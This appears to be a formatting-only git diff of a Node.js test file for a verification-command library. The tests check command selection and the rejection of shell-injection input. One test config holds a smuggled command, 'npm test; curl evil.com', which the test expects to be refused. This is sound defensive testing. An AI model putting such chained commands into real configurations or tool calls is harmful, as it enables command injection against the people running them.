@@ -1,6 +1,10 @@
 import test from 'node:test';
 import assert from 'node:assert/strict';
-import { chooseAutoVerificationCommand, resolveVerificationPlan, isVerificationCommandShellSafe } from '../lib/hydra-verification.mjs';
+import {
+  chooseAutoVerificationCommand,
+  resolveVerificationPlan,
+  isVerificationCommandShellSafe,
+} from '../lib/hydra-verification.mjs';
 
 test('chooseAutoVerificationCommand prefers package typecheck script', () => {
   const selected = chooseAutoVerificationCommand({
@@ -57,7 +61,7 @@ test('resolveVerificationPlan uses explicit config command', () => {
   const plan = resolveVerificationPlan(
     'unused',
     { verification: { onTaskDone: true, command: 'npm run verify', timeoutMs: 45000 } },
-    {}
+    {},
   );
 
   assert.equal(plan.enabled, true);
@@ -70,7 +74,7 @@ test('resolveVerificationPlan disables when onTaskDone is false', () => {
   const plan = resolveVerificationPlan(
     'unused',
     { verification: { onTaskDone: false, command: 'auto', timeoutMs: 60000 } },
-    { npmScripts: { typecheck: 'tsc --noEmit' } }
+    { npmScripts: { typecheck: 'tsc --noEmit' } },
   );
 
   assert.equal(plan.enabled, false);
@@ -81,7 +85,7 @@ test('resolveVerificationPlan supports disabled command aliases', () => {
   const plan = resolveVerificationPlan(
     'unused',
     { verification: { onTaskDone: true, command: 'off', timeoutMs: 60000 } },
-    { npmScripts: { typecheck: 'tsc --noEmit' } }
+    { npmScripts: { typecheck: 'tsc --noEmit' } },
   );
 
   assert.equal(plan.enabled, false);
@@ -93,7 +97,7 @@ test('resolveVerificationPlan returns disabled auto plan when no signal matches'
   const plan = resolveVerificationPlan(
     'unused',
     { verification: { onTaskDone: true, command: 'auto', timeoutMs: 60000 } },
-    { npmScripts: {} }
+    { npmScripts: {} },
   );
 
   assert.equal(plan.enabled, false);
@@ -125,7 +129,7 @@ test('isVerificationCommandShellSafe rejects shell injection characters', () => 
 test('isVerificationCommandShellSafe rejects empty or non-string input', () => {
   assert.equal(isVerificationCommandShellSafe(''), false);
   assert.equal(isVerificationCommandShellSafe(null), false);
-  assert.equal(isVerificationCommandShellSafe(undefined), false);
+  assert.equal(isVerificationCommandShellSafe(), false);
   assert.equal(isVerificationCommandShellSafe(42), false);
 });
 
@@ -133,7 +137,7 @@ test('resolveVerificationPlan rejects unsafe config commands', () => {
   const plan = resolveVerificationPlan(
     'unused',
     { verification: { onTaskDone: true, command: 'npm test; curl evil.com', timeoutMs: 60000 } },
-    {}
+    {},
   );
 
   assert.equal(plan.enabled, false);
@@ -145,7 +149,7 @@ test('resolveVerificationPlan allows safe config commands', () => {
   const plan = resolveVerificationPlan(
     'unused',
     { verification: { onTaskDone: true, command: 'npm run lint', timeoutMs: 60000 } },
-    {}
+    {},
   );
 
   assert.equal(plan.enabled, true);
